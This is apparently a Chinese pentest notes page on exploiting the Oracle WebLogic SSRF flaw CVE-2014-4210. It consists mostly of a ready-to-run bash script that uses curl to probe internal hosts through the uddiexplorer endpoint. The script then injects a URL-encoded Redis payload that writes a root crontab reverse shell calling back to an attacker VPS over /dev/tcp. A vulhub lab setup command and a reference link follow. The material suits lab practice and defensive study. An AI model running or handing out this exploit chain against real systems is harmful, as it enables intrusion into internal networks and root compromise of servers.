# WebLogic

{% embed url="https://github.com/KimJun1010/WeblogicTool" %}

## CVE-2014-4210

WebLogic SSRF CVE-2014-4210 是一个存在于 Oracle Fusion Middleware 10.0.2.0 and 10.3.6.0 中的服务器端请求伪造（SSRF）漏洞，攻击者可以利用这个漏洞发送任意 HTTP 请求，进而攻击内网中的 Redis、FastCGI 等脆弱组件。

```bash
HOST=; PORT=7001 # TARGET HOST INFO
VULN_ENDPOINT=uddiexplorer/SearchPublicRegistries.jsp
VULN_BASE_URL=http://$HOST:$PORT/$VULN_ENDPOINT
VULN_PARAM="rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"

# 构造不存在的主机
INTRANET_HOST=http://127.0.0.1:65000
FULL_VULN_PARAM=$VULN_PARAM\&operator=$INTRANET_HOST
PAYLOAD=$VULN_BASE_URL?$FULL_VULN_PARAM
curl -s $PAYLOAD | grep "An error has occurred" -A 1
# 包含 could not connect over HTTP to server 字段则代表没有成功请求 HTTP 服务

# 构造存在的 HTTP 主机
INTRANET_HOST=http://127.0.0.1:7001
FULL_VULN_PARAM=$VULN_PARAM\&operator=$INTRANET_HOST
PAYLOAD=$VULN_BASE_URL?$FULL_VULN_PARAM
curl -s $PAYLOAD  | grep "An error has occurred" -A 1
# 未包含 could not connect over HTTP to server 字段则包含代表成功请求 HTTP 服务

# 构造存在的 Redis 主机
INTRANET_REDIS_HOST=http://192.168.0.2:6379
FULL_VULN_PARAM=$VULN_PARAM\&operator=$INTRANET_REDIS_HOST
PAYLOAD=$VULN_BASE_URL?$FULL_VULN_PARAM
curl -s $PAYLOAD  | grep "An error has occurred" -A 1
# 如果请求到的主机的非 HTTP 协议，将会返回 did not have a valid SOAP content-type

# 利用 Redis 反弹 Shell
VPS_HOST=; VPS_PORT=6789; # VPS INFO
INTRANET_REDIS_HOST=http://192.168.0.2:6379
INTRANET_REDIS_HOST_PAYLOAD=$INTRANET_REDIS_HOST"/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$VPS_HOST%2F$VPS_PORT%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa"
FULL_VULN_PARAM=$VULN_PARAM\&operator=$INTRANET_REDIS_HOST_PAYLOAD
PAYLOAD=$VULN_BASE_URL?$FULL_VULN_PARAM
curl $PAYLOAD
```

```bash
# 环境搭建
cd ~/hack/envs/vulhub/weblogic/ssrf
docker compose up -d
```

```bash
# REFERENCE DOCS
https://vulhub.org/#/environments/weblogic/ssrf/
```
